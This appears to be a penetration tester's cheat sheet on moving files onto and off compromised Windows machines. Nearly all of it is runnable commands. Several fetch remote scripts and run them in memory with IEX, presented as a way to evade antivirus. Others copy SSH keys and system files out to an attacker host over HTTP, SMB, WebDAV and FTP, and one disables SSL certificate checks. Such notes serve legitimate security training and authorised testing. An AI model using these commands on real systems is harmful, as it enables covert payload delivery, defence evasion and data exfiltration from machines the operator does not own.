# Windows File Transfer Methods

## Methodology

```
Base64 Encode/Decode → PowerShell WebClient → SMB → FTP → WebDAV (SMB over HTTP)
```

Always verify transfers with **MD5 hash** on both ends.

---

## DOWNLOAD Methods (Attacker → Windows Target)

### 1. Base64 Encode/Decode (no network needed)

```bash
# Linux: encode file
md5sum id_rsa
cat id_rsa | base64 -w 0; echo

# Windows: decode and write
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64string>"))

# Verify hash
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ md5sum 52d91df5-24dd-4aa3-b156-8d777b89481e.zip 
2edf25b27b268445694276c20d55449e  52d91df5-24dd-4aa3-b156-8d777b89481e.zip      
┌──(kali㉿kali)-[~/Downloads]
└─$ cat 52d91df5-24dd-4aa3-b156-8d777b89481e.zip | base64 -w 0; echo
UEsDBAoAAAAAAFmEKVFHXocmIAAAACAAAAAOAAAAdXBsb2FkX3dpbi50eHRlNGZlZWM0NjZkNWRlNzAxMDg5YjVjYzFiZjZkNTkyYVBLAQI/AAoAAAAAAFmEKVFHXocmIAAAACAAAAAOACQAAAAAAAAAIAAAAAAAAAB1cGxvYWRfd2luLnR4dAoAIAAAAAAAAQAYAHjm8KnohtYBzETj5fqG1gEXkIab6IbWAVBLBQYAAAAAAQABAGAAAABMAAAAAAA=
```

![image.png](Windows%20File%20Transfer%20Methods/image.png)

> ⚠️ CMD has **8191 char limit** — won't work for large files
> 

---

### 2. PowerShell WebClient (HTTP/HTTPS/FTP)

```powershell
# Download to disk
(New-Object Net.WebClient).DownloadFile('http://IP/file.ps1','C:\Users\Public\file.ps1')
(New-Object Net.WebClient).DownloadFileAsync('http://IP/file.ps1','C:\file.ps1')

# Fileless — run directly in memory (never touches disk)
IEX (New-Object Net.WebClient).DownloadString('http://IP/script.ps1')

# Pipeline version
(New-Object Net.WebClient).DownloadString('http://IP/script.ps1') | IEX

# Invoke-WebRequest (slower, PS 3.0+)
Invoke-WebRequest http://IP/file.ps1 -OutFile file.ps1
```

**Common Errors & Fixes:**

```powershell
# IE not configured
Invoke-WebRequest http://IP/file -UseBasicParsing | IEX

# SSL cert not trusted
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

---

### 3. SMB Download

```bash
# Attacker — start SMB server (anonymous)
sudo impacket-smbserver share -smb2support /tmp/smbshare
# Windows — copy file
copy \\192.168.49.128\share\nc.exe

# With credentials (needed for newer Windows)
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
# If auth required, mount first
net use n: \\192.168.49.128\share /user:test test
copy n:\nc.exe
```

---

### 4. FTP Download

```bash
# Attacker — start FTP server
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

```powershell
# Windows — PowerShell download
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt','C:\file.txt')
```

```bash
# Non-interactive FTP (no shell)
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

---

## UPLOAD Methods (Windows Target → Attacker)

### 1. Base64 Encode on Windows → Decode on Linux

```powershell
# Windows: encode
[Convert]::ToBase64String((Get-Content -Path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
Get-FileHash "C:\...\hosts" -Algorithm MD5
```

```bash
# Linux: decode
echo <base64> | base64 -d > hosts
md5sum hosts
```

---

### 2. PowerShell Web Upload (HTTP)

```bash
# Attacker — start upload server
pip3 install uploadserver
python3 -m uploadserver   # listens on port 8000
```

```powershell
# Windows — upload using PSUpload script
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

**Alternative — Base64 POST via netcat:**

```powershell
# Windows: encode + POST
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\...\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

```bash
# Linux: catch with netcat
nc -lvnp 8000
# then decode
echo <base64> | base64 -d -w 0 > hosts
```

---

### 3. SMB Upload via WebDAV (bypasses SMB port 445 blocks)

> SMB over HTTP — falls back to HTTP if port 445 is blocked
> 

```bash
# Attacker — setup WebDAV server
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```bash
# Windows — connect and upload
dir \\192.168.49.128\DavWWWRoot
copy C:\Users\john\Desktop\file.zip \\192.168.49.128\DavWWWRoot\
copy C:\file.zip \\192.168.49.128\sharefolder\
```

---

### 4. FTP Upload

```bash
# Attacker — start FTP with write permission
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
# Windows — upload
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/hosts','C:\Windows\System32\drivers\etc\hosts')
```

```bash
# Non-interactive FTP upload
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

---

## Quick Reference — Method vs Port Used

| Method | Port | Notes |
| --- | --- | --- |
| PowerShell WebClient | 80/443 | Most reliable, HTTP usually allowed |
| SMB (Impacket) | 445 | Blocked externally usually |
| WebDAV | 80/443 | SMB over HTTP — great bypass |
| FTP | 21 | Often blocked outbound |
| Base64 | None | No network — best when all else blocked |
| Fileless (IEX) | 80/443 | Never touches disk → evades AV |

---